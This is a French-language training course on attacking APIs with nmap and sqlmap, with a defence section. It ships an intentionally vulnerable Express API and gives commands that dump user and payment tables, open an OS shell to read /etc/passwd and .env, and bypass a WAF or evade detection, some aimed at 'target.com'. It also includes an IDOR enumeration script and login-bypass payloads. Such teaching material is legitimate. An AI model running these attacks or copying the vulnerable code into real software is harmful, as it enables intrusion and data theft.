# Exercices Pratiques : Attaques API avec nmap et sqlmap

**Formation sécurité offensive - Usage pédagogique uniquement**

**AVERTISSEMENT** : Ces techniques sont pour apprentissage sur vos propres systèmes uniquement. Attaquer des systèmes sans autorisation est illégal.

---

## Prérequis

### Installation Outils

**nmap (Reconnaissance)** :

| OS | Installation |
|----|--------------|
| **Linux** | `sudo apt-get install nmap` |
| **macOS** | `brew install nmap` |
| **Windows** | Télécharger sur [nmap.org](https://nmap.org/download.html) |

**sqlmap (SQL Injection)** :

| OS | Installation |
|----|--------------|
| **Linux/macOS** | `pip install sqlmap` ou `git clone https://github.com/sqlmapproject/sqlmap.git` |
| **Windows** | `pip install sqlmap` |

**Vérification** :

```bash
nmap --version
sqlmap --version
```

---

## Setup Environnement de Test

### Option 1 : API Vulnérable Locale

**Créer API test** : `vulnerable-api.js`

```javascript
const express = require('express')
const app = express()
const sqlite3 = require('sqlite3')

const db = new sqlite3.Database(':memory:')

// Créer tables
db.serialize(() => {
  db.run(`CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    email TEXT,
    password TEXT,
    role TEXT
  )`)
  
  db.run(`CREATE TABLE courses (
    id INTEGER PRIMARY KEY,
    title TEXT,
    tier TEXT,
    price REAL
  )`)
  
  db.run(`INSERT INTO users VALUES (1, 'admin@test.com', 'admin123', 'admin')`)
  db.run(`INSERT INTO users VALUES (2, 'user@test.com', 'user123', 'user')`)
  db.run(`INSERT INTO courses VALUES (1, 'Cours Gratuit', 'free', 0)`)
  db.run(`INSERT INTO courses VALUES (2, 'Cours Premium', 'premium', 99.99)`)
})

app.use(express.json())

// Endpoint VULNÉRABLE SQL Injection
app.get('/api/search', (req, res) => {
  const search = req.query.q
  
  // DANGER : Concatenation SQL
  const query = `SELECT * FROM courses WHERE title LIKE '%${search}%'`
  
  db.all(query, (err, rows) => {
    if (err) return res.status(500).send(err.message)
    return res.json(rows)
  })
})

// Endpoint VULNÉRABLE IDOR
app.get('/api/user/:id', (req, res) => {
  db.get(`SELECT * FROM users WHERE id = ${req.params.id}`, (err, row) => {
    if (err) return res.status(500).send(err.message)
    return res.json(row)
  })
})

// Endpoint Login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body
  
  // Vulnérable SQL Injection aussi
  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`
  
  db.get(query, (err, user) => {
    if (err) return res.status(500).send(err.message)
    if (!user) return res.status(401).json({ error: 'Invalid credentials' })
    
    return res.json({ 
      success: true, 
      token: 'fake-jwt-token',
      user: user 
    })
  })
})

app.listen(3000, () => {
  console.log('API vulnérable sur http://localhost:3000')
  console.log('Endpoints:')
  console.log('  GET  /api/search?q=test')
  console.log('  GET  /api/user/:id')
  console.log('  POST /api/login')
})
```

**Lancer** :

```bash
npm install express sqlite3
node vulnerable-api.js
```

---

### Option 2 : DVWA (Damn Vulnerable Web App)

```bash
docker run -d -p 80:80 vulnerables/web-dvwa
```

**Accès** : http://localhost

---

## EXERCICE 1 : Reconnaissance avec nmap

### Objectif

Découvrir services, ports ouverts, versions

---

### Étape 1.1 : Scan Basique (2 min)

**Commande** :

```bash
nmap localhost
```

**Résultat** :

```
Starting Nmap scan...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  unknown
```

**Analyse** :
- Port 3000 ouvert (notre API)
- Port 80 (web server)
- Port 22 (SSH)

---

### Étape 1.2 : Scan Détection Version (5 min)

**Commande** :

```bash
nmap -sV localhost
```

**Résultat** :

```
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express
```

**Analyse** : API utilise Node.js Express

---

### Étape 1.3 : Scan Scripts NSE (10 min)

**Commande** :

```bash
nmap -sV --script=http-enum localhost -p 3000
```

**Résultat** :

```
PORT     STATE SERVICE
3000/tcp open  http
| http-enum:
|   /api/search
|   /api/user
|   /api/login
```

**Analyse** : Endpoints API découverts

---

### Étape 1.4 : Scan Complet (15 min)

**Commande** :

```bash
nmap -sV -sC -p- -T4 localhost -oN scan-results.txt
```

**Paramètres** :

| Flag | Signification |
|------|---------------|
| `-sV` | Détection version |
| `-sC` | Scripts par défaut |
| `-p-` | Tous ports (1-65535) |
| `-T4` | Timing rapide |
| `-oN` | Output fichier texte |

**Résultat** : Fichier `scan-results.txt` avec infos complètes

---

### Tableau Commandes nmap Utiles

| Commande | Usage | Temps |
|----------|-------|-------|
| `nmap <host>` | Scan basique | 1 min |
| `nmap -sV <host>` | Détection services | 2 min |
| `nmap -p 1-1000 <host>` | Scan ports 1-1000 | 2 min |
| `nmap -p- <host>` | Tous ports | 10 min |
| `nmap -sV -sC <host>` | Scan complet | 5 min |
| `nmap --script=http-enum <host>` | Énumérer endpoints | 3 min |
| `nmap -O <host>` | Détection OS | 2 min |
| `nmap -A <host>` | Tout (agressif) | 10 min |

---

## EXERCICE 2 : SQL Injection avec sqlmap

### Objectif

Exploiter injection SQL pour extraire données

---

### Étape 2.1 : Test Endpoint Vulnérable (2 min)

**Test manuel** :

```bash
# Requête normale
curl "http://localhost:3000/api/search?q=Gratuit"

# Résultat
[{"id":1,"title":"Cours Gratuit","tier":"free","price":0}]
```

**Test injection manuelle** :

```bash
# Injection basique
curl "http://localhost:3000/api/search?q=%27%20OR%201=1%20--"

# Décodé : ' OR 1=1 --
```

**Résultat si vulnérable** :

```json
[
  {"id":1,"title":"Cours Gratuit","tier":"free","price":0},
  {"id":2,"title":"Cours Premium","tier":"premium","price":99.99}
]
```

Tous cours retournés (bypass tier)

---

### Étape 2.2 : sqlmap Scan Automatique (5 min)

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  --banner
```

**Paramètres** :

| Flag | Signification |
|------|---------------|
| `-u` | URL cible |
| `--batch` | Mode automatique (pas de questions) |
| `--banner` | Afficher banner DBMS |

**Résultat** :

```
[INFO] testing connection
[INFO] testing if GET parameter 'q' is dynamic
[INFO] GET parameter 'q' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable
[INFO] testing for SQL injection
[SUCCESS] GET parameter 'q' is vulnerable to SQL injection

[INFO] the back-end DBMS is SQLite
web server operating system: Linux
web application technology: Express
back-end DBMS: SQLite
```

**Analyse** : Vulnérabilité SQL confirmée

---

### Étape 2.3 : Énumérer Databases (3 min)

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  --dbs
```

**Résultat** :

```
available databases [1]:
[*] main
```

---

### Étape 2.4 : Énumérer Tables (3 min)

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  -D main \
  --tables
```

**Résultat** :

```
Database: main
[2 tables]
+----------+
| courses  |
| users    |
+----------+
```

**Analyse** : 2 tables découvertes (courses, users)

---

### Étape 2.5 : Dump Table Users (5 min)

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  -D main \
  -T users \
  --dump
```

**Résultat** :

```
Database: main
Table: users
[2 entries]
+----+------------------+-----------+-------+
| id | email            | password  | role  |
+----+------------------+-----------+-------+
| 1  | admin@test.com   | admin123  | admin |
| 2  | user@test.com    | user123   | user  |
+----+------------------+-----------+-------+
```

**Impact** : Database complète exposée (emails, passwords, roles)

---

### Étape 2.6 : Dump Tout (10 min)

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  --dump-all
```

**Résultat** : Toutes tables, toutes données extraites

---

### Étape 2.7 : Injection POST (Advanced)

**Si endpoint POST vulnérable** :

```bash
sqlmap -u "http://localhost:3000/api/login" \
  --data="email=test@test.com&password=test" \
  --method=POST \
  --batch
```

---

### Tableau Commandes sqlmap

| Commande | Usage | Temps |
|----------|-------|-------|
| `sqlmap -u URL` | Test injection basique | 2 min |
| `--batch` | Automatique (pas de questions) | - |
| `--dbs` | Lister databases | 3 min |
| `--tables` | Lister tables | 3 min |
| `-T table --dump` | Dump table spécifique | 5 min |
| `--dump-all` | Dump tout | 10 min |
| `--technique=U` | Union-based (rapide) | Variable |
| `--risk=3 --level=5` | Test agressif | Plus long |
| `--os-shell` | Shell interactif (avancé) | Si possible |
| `--sql-shell` | SQL shell interactif | Si possible |

---

## EXERCICE 3 : Combinaison nmap + sqlmap

### Workflow Complet Attaque

**Étape 1 : Reconnaissance (nmap)**

```bash
# Découvrir API
nmap -sV --script=http-enum target.com -p 80,443,3000,8080
```

**Résultat attendu** :
- Ports ouverts identifiés
- Endpoints découverts
- Technologies détectées

---

**Étape 2 : Mapping Endpoints**

```bash
# Script nmap pour HTTP methods
nmap -sV --script=http-methods target.com -p 3000
```

**Résultat** :

```
Supported Methods: GET POST PUT DELETE
Endpoints found:
  /api/search
  /api/users
  /api/login
```

---

**Étape 3 : Test Vulnérabilités (sqlmap)**

**Sur chaque endpoint GET avec paramètres** :

```bash
# Test /api/search
sqlmap -u "http://target.com/api/search?q=test" --batch

# Test /api/user  
sqlmap -u "http://target.com/api/user?id=1" --batch

# Test /api/courses
sqlmap -u "http://target.com/api/courses?category=web" --batch
```

**Chercher** : `[SUCCESS] parameter 'X' is vulnerable`

---

**Étape 4 : Exploitation**

**Si vulnérabilité trouvée** :

```bash
# Dump données sensibles
sqlmap -u "http://target.com/api/search?q=test" \
  --batch \
  -D database_name \
  -T users \
  --dump \
  --threads=5
```

---

### Script Automatisé

**Créer** : `auto-scan.sh`

```bash
#!/bin/bash

TARGET=$1

echo "[1] Reconnaissance nmap..."
nmap -sV --script=http-enum $TARGET -p 3000 -oN nmap-scan.txt

echo "[2] Extraction endpoints..."
ENDPOINTS=$(grep -oP '/api/\w+' nmap-scan.txt)

echo "[3] Test SQL injection sur chaque endpoint..."
for endpoint in $ENDPOINTS; do
  echo "Testing $endpoint..."
  sqlmap -u "http://$TARGET$endpoint?id=1" --batch --level=1 --risk=1
done

echo "[4] Scan terminé. Voir résultats ci-dessus."
```

**Utilisation** :

```bash
chmod +x auto-scan.sh
./auto-scan.sh localhost:3000
```

---

## EXERCICE 4 : Exploitation Avancée sqlmap

### Étape 4.1 : Déterminer Type Injection

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --technique=BEUSTQ \
  --batch
```

**Techniques** :

| Code | Nom | Description |
|------|-----|-------------|
| **B** | Boolean-based | `AND 1=1` vs `AND 1=2` |
| **E** | Error-based | Messages d'erreur SQL |
| **U** | Union-based | UNION SELECT |
| **S** | Stacked queries | `; DROP TABLE` |
| **T** | Time-based | `SLEEP(5)` |
| **Q** | Inline queries | Queries imbriquées |

**Résultat** : Identifie quelle technique fonctionne

---

### Étape 4.2 : Shell SQL Interactif

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  --sql-shell
```

**Shell interactif** :

```
sql-shell> SELECT * FROM users WHERE role = 'admin';

[INFO] fetching SQL SELECT statement query output: 'SELECT * FROM users WHERE role = 'admin''
+----+------------------+-----------+-------+
| id | email            | password  | role  |
+----+------------------+-----------+-------+
| 1  | admin@test.com   | admin123  | admin |
+----+------------------+-----------+-------+
```

**Possibilités** :
- Exécuter queries SQL arbitrary
- Extraire données ciblées
- Modifier données (UPDATE, DELETE)

---

### Étape 4.3 : OS Shell (Si Permissions)

**Commande** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" \
  --batch \
  --os-shell
```

**Si successful** :

```
os-shell> ls -la
os-shell> cat /etc/passwd
os-shell> whoami
```

**Impact** : Contrôle serveur complet

---

### Étape 4.4 : Bypass WAF

**Si WAF détecté** :

```bash
sqlmap -u "http://target.com/api/search?q=test" \
  --batch \
  --tamper=space2comment \
  --random-agent
```

**Tamper scripts** :

| Script | Action |
|--------|--------|
| `space2comment` | Remplace espaces par `/**/` |
| `between` | `> 1` devient `NOT BETWEEN 0 AND 1` |
| `randomcase` | `SeLeCt` au lieu de `SELECT` |
| `charencode` | Encode caractères |

---

### Tableau Options sqlmap Avancées

| Option | Usage | Exemple |
|--------|-------|---------|
| `--level=5` | Tests approfondis | Plus de payloads |
| `--risk=3` | Tests risqués (DROP, etc.) | Dangereux |
| `--threads=10` | Parallélisation | Plus rapide |
| `--tamper=script` | Bypass WAF | Éviter détection |
| `--random-agent` | User-Agent aléatoire | Éviter détection |
| `--proxy=http://127.0.0.1:8080` | Via Burp | Voir requêtes |
| `--cookie="session=xxx"` | Avec auth | Si auth requise |
| `--headers="Auth: Bearer xxx"` | Headers custom | APIs modernes |

---

## EXERCICE 5 : Attaque Complète Guidée

### Scénario : API E-commerce Vulnérable

**Cible** : Application vente cours

---

### Phase 1 : Reconnaissance (10 min)

**Étape 1 : Scan ports**

```bash
nmap -sV target.com -p 80,443,3000,8080
```

**Résultat** :

```
PORT     STATE SERVICE
443/tcp  open  https
3000/tcp open  http (Node.js)
```

**Note** : API sur port 3000

---

**Étape 2 : Énumération endpoints**

```bash
nmap --script=http-enum target.com -p 3000
```

**Résultat** :

```
Endpoints discovered:
  /api/courses
  /api/search
  /api/user
  /api/checkout
```

---

**Étape 3 : Test manuel endpoints**

```bash
# Test chaque endpoint
curl http://target.com:3000/api/courses
curl http://target.com:3000/api/search?q=test
curl http://target.com:3000/api/user/1
```

**Observer** : Lesquels répondent, structure données

---

### Phase 2 : Identification Vulnérabilités (15 min)

**Test injection sur /api/search** :

```bash
sqlmap -u "http://target.com:3000/api/search?q=test" \
  --batch \
  --level=2 \
  --risk=2
```

**Attendre résultat** :

```
[SUCCESS] GET parameter 'q' is vulnerable to SQL injection
sqlmap identified the following injection point(s):
---
Parameter: q (GET)
  Type: boolean-based blind
  Type: time-based blind
  Type: UNION query
---
```

**Vulnérabilité confirmée**

---

### Phase 3 : Exploitation (20 min)

**Étape 1 : Lister tables**

```bash
sqlmap -u "http://target.com:3000/api/search?q=test" \
  --batch \
  --tables
```

**Résultat** :

```
[4 tables]
+---------------+
| users         |
| courses       |
| purchases     |
| payments      |
+---------------+
```

---

**Étape 2 : Dump table sensible (users)**

```bash
sqlmap -u "http://target.com:3000/api/search?q=test" \
  --batch \
  -T users \
  --dump
```

**Résultat** :

```
Table: users
[1000 entries]
+------+--------------------+----------------+--------+---------------+
| id   | email              | password_hash  | role   | subscription  |
+------+--------------------+----------------+--------+---------------+
| 1    | admin@site.com     | $2b$10$...     | admin  | premium       |
| 2    | user1@site.com     | $2b$10$...     | user   | free          |
...
```

**Impact** :
- 1000 emails exposés
- Hashes passwords (crackables)
- Rôles et subscriptions

---

**Étape 3 : Dump table paiements**

```bash
sqlmap -u "http://target.com:3000/api/search?q=test" \
  --batch \
  -T payments \
  --dump
```

**Résultat** :

```
Table: payments
[500 entries]
+------+----------+------------+---------+
| id   | user_id  | amount     | status  |
+------+----------+------------+---------+
| 1    | 45       | 99.99      | paid    |
| 2    | 67       | 29.99      | paid    |
...

Total revenue exposed: 25,000 dollars
```

**Impact** : Données financières exposées

---

### Phase 4 : Post-Exploitation (10 min)

**Si permissions suffisantes** :

```bash
# OS Command execution
sqlmap -u "http://target.com:3000/api/search?q=test" \
  --batch \
  --os-cmd="whoami"

# Résultat
www-data
```

**Ou shell complet** :

```bash
sqlmap -u "http://target.com:3000/api/search?q=test" \
  --batch \
  --os-shell

# Shell interactif
os-shell> ls -la
os-shell> cat config.js  # Secrets exposés
os-shell> cat .env       # API keys
```

---

## EXERCICE 6 : Défense et Correction

### Étape 6.1 : Identifier Faille

**Code vulnérable identifié** :

```javascript
const query = `SELECT * FROM courses WHERE title LIKE '%${search}%'`
```

**Problème** : Concatenation directe input utilisateur

---

### Étape 6.2 : Corriger Injection

**Fix 1 : Prepared Statements**

```javascript
// Sécurisé
app.get('/api/search', (req, res) => {
  const search = req.query.q
  
  db.all(
    'SELECT * FROM courses WHERE title LIKE ?',
    [`%${search}%`],
    (err, rows) => {
      if (err) return res.status(500).send(err.message)
      return res.json(rows)
    }
  )
})
```

**Test après correction** :

```bash
sqlmap -u "http://localhost:3000/api/search?q=test" --batch

# Résultat
[WARNING] GET parameter 'q' does not seem to be injectable
```

Injection bloquée

---

### Étape 6.3 : Tester avec nmap

**Vérifier correction** :

```bash
nmap --script=http-sql-injection target.com -p 3000
```

**Résultat attendu** :

```
PORT     STATE SERVICE
3000/tcp open  http
| http-sql-injection:
|   No SQL injection vulnerabilities found
```

---

## EXERCICE 7 : Scénarios Pratiques

### Exercice 7.1 : Scan API Inconnue

**Contexte** : API découverte, aucune documentation

**Tâche** : Découvrir structure et vulnérabilités

**Étapes** :

1. **Scan ports** (nmap)
2. **Énumérer endpoints** (nmap http-enum)
3. **Tester chaque endpoint manuellement** (curl)
4. **Test injection automatique** (sqlmap sur chaque param)
5. **Documenter résultats**

**Livrable** : Rapport avec vulnérabilités trouvées

---

### Exercice 7.2 : Exploitation Login

**Contexte** : Endpoint `/api/login` trouvé

**Tâche** : Tester SQL injection authentication bypass

**Commande** :

```bash
sqlmap -u "http://target.com/api/login" \
  --data="email=admin@test.com&password=test" \
  --method=POST \
  --level=5 \
  --risk=3
```

**Payloads injection typiques** :

```
email: admin@test.com' OR '1'='1
password: ' OR '1'='1

Query devient:
SELECT * FROM users 
WHERE email = 'admin@test.com' OR '1'='1' 
AND password = '' OR '1'='1'
```

**Résultat si vulnérable** : Login sans password

---

### Exercice 7.3 : Énumération IDOR

**Contexte** : Endpoint `/api/invoice/:id` découvert

**Tâche** : Énumérer factures accessibles

**Script Python** :

```python
# idor_scan.py
import requests

base_url = "http://target.com/api/invoice/"

found = []

for invoice_id in range(1, 1000):
    url = f"{base_url}{invoice_id}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        found.append(data)
        print(f"[FOUND] Invoice {invoice_id}: {data['amount']} dollars")
    elif response.status_code == 403:
        print(f"[FORBIDDEN] Invoice {invoice_id}")
    
print(f"\nTotal invoices found: {len(found)}")
```

**Exécution** :

```bash
python idor_scan.py
```

**Résultat** :

```
[FOUND] Invoice 1: 99.99 dollars
[FORBIDDEN] Invoice 2
[FOUND] Invoice 3: 49.99 dollars
...
Total invoices found: 347
```

---

## Tableau Récapitulatif Exercices

### Exercices Proposés

| Exercice | Outil | Difficulté | Durée | Objectif |
|----------|-------|------------|-------|----------|
| **1** | nmap | Facile | 15 min | Reconnaissance basique |
| **2** | sqlmap | Moyen | 20 min | SQL injection discovery + dump |
| **3** | nmap + sqlmap | Moyen | 30 min | Workflow complet |
| **4** | sqlmap avancé | Avancé | 20 min | Exploitation profonde |
| **5** | Script Python | Facile | 15 min | IDOR automation |
| **6** | Correction | Moyen | 20 min | Sécuriser code |

**Total** : ~2h d'exercices pratiques

---

## Méthodes Détection

### Comment API Détecte Attaques

**Indicateurs nmap** :

| Indicateur | Détection |
|------------|-----------|
| Multiples connexions rapides | Rate limiting, IP ban |
| User-Agent "nmap" | Blacklist User-Agent |
| Scan tous ports | IDS/IPS alerte |
| Patterns reconnaissance | WAF bloque |

**Éviter détection nmap** :

```bash
# Scan lent
nmap -T1 target.com

# Changer User-Agent
nmap --script-args http.useragent="Mozilla/5.0..." target.com

# Fragmenter paquets
nmap -f target.com
```

---

**Indicateurs sqlmap** :

| Indicateur | Détection |
|------------|-----------|
| Multiples requêtes identiques | Rate limiting |
| Payloads SQL caractéristiques | WAF (Cloudflare, etc.) |
| User-Agent "sqlmap" | Blacklist |
| Erreurs SQL répétées | Monitoring logs |

**Éviter détection sqlmap** :

```bash
# User-Agent aléatoire
sqlmap -u URL --random-agent

# Délai entre requêtes
sqlmap -u URL --delay=2

# Proxy/Tor
sqlmap -u URL --proxy="http://127.0.0.1:8080"

# Tamper scripts
sqlmap -u URL --tamper=space2comment,randomcase
```

---

## Protection Contre Ces Attaques

### Tableau Défenses

| Attaque | Détection | Prévention |
|---------|-----------|------------|
| **nmap scan** | IDS/IPS, Rate limit | Firewall, Fail2ban |
| **sqlmap injection** | WAF, Pattern matching | Prepared statements + RLS |
| **IDOR enum** | Rate limit, Monitoring | UUIDs + RLS + authz |
| **Brute force** | Failed attempts | Rate limit 5/15min |
| **Shell access** | Impossible si sécurisé | Permissions DB strictes |

---

### Défense Layer par Layer

**Layer 1 : Infrastructure**

```bash
# Firewall
sudo ufw enable
sudo ufw allow 443/tcp
sudo ufw deny 3000/tcp  # Pas d'accès direct API

# Fail2ban (ban après 5 tentatives)
sudo apt-get install fail2ban
```

**Layer 2 : Application**

```javascript
// Rate limiting
const rateLimit = require('express-rate-limit')

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
})

app.use('/api/', limiter)

// Helmet (headers sécurité)
const helmet = require('helmet')
app.use(helmet())

// Input validation
const { body, validationResult } = require('express-validator')

app.get('/api/search', 
  [query('q').isString().trim().escape()],
  (req, res) => {
    const errors = validationResult(req)
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() })
    }
    // ... sécurisé
  }
)
```

**Layer 3 : Database**

```sql
-- RLS (protection finale)
ALTER TABLE courses ENABLE ROW LEVEL SECURITY;

CREATE POLICY "public_or_purchased"
ON courses FOR SELECT
USING (
  tier = 'free' 
  OR 
  EXISTS (
    SELECT 1 FROM purchases 
    WHERE course_id = courses.id 
    AND user_id = auth.uid()
  )
);
```

**Layer 4 : Monitoring**

```javascript
// Logger attaques
const winston = require('winston')

app.use((req, res, next) => {
  // Détecter patterns suspects
  if (req.query.q && req.query.q.includes('OR 1=1')) {
    winston.warn('Possible SQL injection attempt', {
      ip: req.ip,
      query: req.query,
      url: req.url
    })
    return res.status(403).send('Suspicious activity detected')
  }
  next()
})
```

---

## Checklist Sécurité Post-Test

### Après Exercices, Vérifier

**Infrastructure** :
- [ ] nmap scan bloqué par firewall
- [ ] Ports inutiles fermés
- [ ] IDS/IPS actif
- [ ] Rate limiting actif

**Application** :
- [ ] Tous endpoints avec auth
- [ ] Prepared statements partout
- [ ] Input validation
- [ ] Pas de secrets hardcodés

**Database** :
- [ ] RLS activé
- [ ] Permissions minimales
- [ ] Pas de user root pour app
- [ ] Backup réguliers

**Monitoring** :
- [ ] Logs attaques
- [ ] Alertes anomalies
- [ ] Dashboard monitoring
- [ ] Incident response plan

---

## Ressources Apprentissage

### Plateformes Légales pour Pratiquer

| Plateforme | Type | Gratuit | Niveau |
|------------|------|---------|--------|
| **DVWA** | Web app vulnérable | Oui | Débutant |
| **HackTheBox** | Challenges hacking | Freemium | Tous niveaux |
| **TryHackMe** | Exercices guidés | Freemium | Débutant/Inter |
| **PentesterLab** | Exercices sécu | Payant | Inter/Avancé |
| **PortSwigger Academy** | Web security | Gratuit | Tous niveaux |
| **OWASP WebGoat** | Java vulnérable | Gratuit | Débutant |

---

### Documentation Outils

**nmap** :
- [nmap.org/book/man.html](https://nmap.org/book/man.html) - Manuel complet
- Scripts NSE : `/usr/share/nmap/scripts/`

**sqlmap** :
- [sqlmap.org](https://sqlmap.org) - Documentation
- GitHub : [github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

---

## Synthèse Commandes

### nmap Cheatsheet

```bash
# Scan basique
nmap target.com

# Scan avec versions
nmap -sV target.com

# Scan complet
nmap -sV -sC -p- target.com

# Énumérer HTTP
nmap --script=http-enum target.com -p 80,443

# Détection OS
nmap -O target.com

# Scan rapide top 1000 ports
nmap -T4 -F target.com

# Output fichier
nmap target.com -oN results.txt
```

---

### sqlmap Cheatsheet

```bash
# Test basique
sqlmap -u "URL?param=value" --batch

# Dump database
sqlmap -u "URL?param=value" --batch --dump-all

# Test POST
sqlmap -u "URL" --data="param=value" --method=POST

# Avec authentication
sqlmap -u "URL" --cookie="session=xxx"
sqlmap -u "URL" --headers="Authorization: Bearer xxx"

# Levels et risk
sqlmap -u "URL" --level=5 --risk=3

# Shell SQL
sqlmap -u "URL" --sql-shell

# Tamper WAF
sqlmap -u "URL" --tamper=space2comment --random-agent

# Via proxy Burp
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"
```

---

## Conclusion

### Compétences Acquises

**Avec nmap** :
- Scan reconnaissance
- Détection services
- Énumération endpoints
- Identification technologies

**Avec sqlmap** :
- Détection SQL injection
- Exploitation injection
- Dump databases
- Post-exploitation

**Défense** :
- Identifier vulnérabilités
- Corriger code
- Implémenter protections
- Monitoring

---

### Messages Clés

**Attaque facile** :
- nmap : 5 minutes découvrir API
- sqlmap : 10 minutes dump database

**Défense nécessaire** :
- Prepared statements (obligatoire)
- RLS (fortement recommandé)
- WAF (protection layer)
- Monitoring (détection)

**Pour ton projet** :
- Tester avec nmap + sqlmap
- Corriger toutes vulnérabilités
- Utiliser Supabase (RLS protection)

---

**Exercices pratiques nmap + sqlmap pour formation sécurité offensive.**

